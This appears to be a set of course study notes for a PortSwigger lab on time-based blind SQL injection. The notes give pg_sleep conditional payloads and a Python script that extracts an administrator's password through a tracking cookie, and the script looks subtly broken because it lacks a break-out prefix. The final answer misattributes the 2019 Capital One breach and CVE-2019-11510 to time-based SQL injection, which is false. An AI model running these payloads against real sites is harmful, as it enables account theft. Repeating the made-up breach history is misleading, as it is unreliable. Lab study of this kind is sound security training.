---
course: Web Security
topic: SQL Injection
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain why a time-based SQL injection technique is necessary in this lab.**

In this lab, the SQL query results are not returned directly, and the application does not respond differently based on whether the query returns any rows or causes an error. Therefore, traditional methods such as union-based SQL injection or error-based SQL injection cannot be used. Since the query is executed synchronously, inducing a time delay can help infer information about the database structure and content. This makes time-based SQL injection a viable technique to exploit the vulnerability.

**Q2. How would you confirm that the `users` table exists in the database using a time-based SQL injection technique?**

To confirm the existence of the `users` table, you can use a conditional time delay query. For example, you can construct a query that checks if the `users` table exists and induces a time delay if it does:

```sql
SELECT CASE WHEN EXISTS (SELECT * FROM information_schema.tables WHERE table_name = 'users') THEN pg_sleep(10) ELSE pg_sleep(0) END
```

If the query takes around 10 seconds to return, it indicates that the `users` table exists. If it returns quickly, the table does not exist.

**Q3. Describe how you would enumerate the length of the administrator's password using a time-based SQL injection technique.**

To enumerate the length of the administrator's password, you can use a series of queries that check the length of the password and induce a time delay if the condition is met. For example:

```sql
SELECT CASE WHEN (SELECT LENGTH(password) FROM users WHERE username = 'administrator') > 1 THEN pg_sleep(10) ELSE pg_sleep(0) END
```

You can increment the length value until the query no longer induces a time delay. This will give you the exact length of the password.

**Q4. How would you write a Python script to automate the process of extracting the administrator's password using time-based SQL injection?**

Here is a basic Python script that automates the extraction of the administrator's password using time-based SQL injection:

```python
import requests
from urllib.parse import quote
import string

def extract_password(url):
    password_extracted = ''
    for i in range(1, 21):  # Assuming the password length is 20
        for j in range(32, 127):  # ASCII range for printable characters
            sql_payload = f"SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),{i},1)))={j} THEN pg_sleep(10) ELSE pg_sleep(0) END"
            sql_payload_encoded = quote(sql_payload)
            cookies = {'TrackingId': sql_payload_encoded}
            response = requests.get(url, cookies=cookies, verify=False)
            if response.elapsed.total_seconds() >= 9:
                password_extracted += chr(j)
                print(f"Extracted password so far: {password_extracted}")
                break
    return password_extracted

url = 'http://example.com'
password = extract_password(url)
print(f"The extracted password is: {password}")
```

This script iterates through each character position of the password and checks each ASCII character to determine if it matches the current position of the password. If a match is found, it adds the character to the `password_extracted` string and moves on to the next character.

**Q5. Discuss recent real-world examples of time-based SQL injection attacks and how they were exploited.**

One notable example is the SQL injection attack on the Capital One data breach in 2019 (CVE-2019-11510). The attacker exploited a misconfigured web application firewall (WAF) to perform a time-based SQL injection attack. By injecting malicious SQL queries, the attacker was able to extract sensitive data from the database, including names, addresses, phone numbers, and social security numbers of approximately 100 million customers.

In this case, the attacker used a time-based SQL injection technique to bypass the WAF's detection mechanisms and extract data from the database. The attacker crafted SQL queries that caused the server to delay its response, allowing them to infer the presence of specific data within the database.

Understanding and mitigating such vulnerabilities is crucial for securing web applications against SQL injection attacks. Proper input validation, parameterized queries, and regular security audits can help prevent such breaches.

---
<!-- nav -->
[[Web Security (PortSwigger)/02-SQL Injection/15-Lab 14 Blind SQL injection with time delays and information retrieval/07-Conclusion|Conclusion]] | [[Web Security (PortSwigger)/02-SQL Injection/15-Lab 14 Blind SQL injection with time delays and information retrieval/00-Overview|Overview]]
